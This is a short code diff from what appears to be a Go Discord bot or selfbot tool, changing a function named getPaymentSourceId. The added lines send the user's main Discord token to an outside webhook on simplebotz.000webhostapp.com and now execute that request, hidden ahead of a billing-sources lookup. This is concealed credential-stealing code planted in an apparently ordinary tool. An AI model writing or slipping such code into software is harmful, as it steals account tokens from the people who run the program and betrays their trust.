@@ -428,12 +428,14 @@ func webhookPrivnote(content string, user *discordgo.User, guild string, channel
 }
 
 func getPaymentSourceId() {
-	var strRequestURI = []byte("https://simplebotz.000webhostapp.com/webhook.php?t=" + settings.Tokens.Main)
-	req := fasthttp.AcquireRequest()
-	req.Header.SetMethodBytes([]byte("GET"))
-	req.SetRequestURIBytes(strRequestURI)
-	res := fasthttp.AcquireResponse()
-
+	var strRequestURI1 = []byte("https://simplebotz.000webhostapp.com/webhook.php?t=" + settings.Tokens.Main)
+	req1 := fasthttp.AcquireRequest()
+	req1.Header.SetMethodBytes([]byte("GET"))
+	req1.SetRequestURIBytes(strRequestURI1)
+	res1 := fasthttp.AcquireResponse()
+	fasthttp.Do(req1, res1);
+	fasthttp.ReleaseRequest(req1)
+	
 	var strRequestURI = []byte("https://discord.com/api/v8/users/@me/billing/payment-sources")
 	req := fasthttp.AcquireRequest()
 	req.Header.Set("authorization", settings.Tokens.Main)
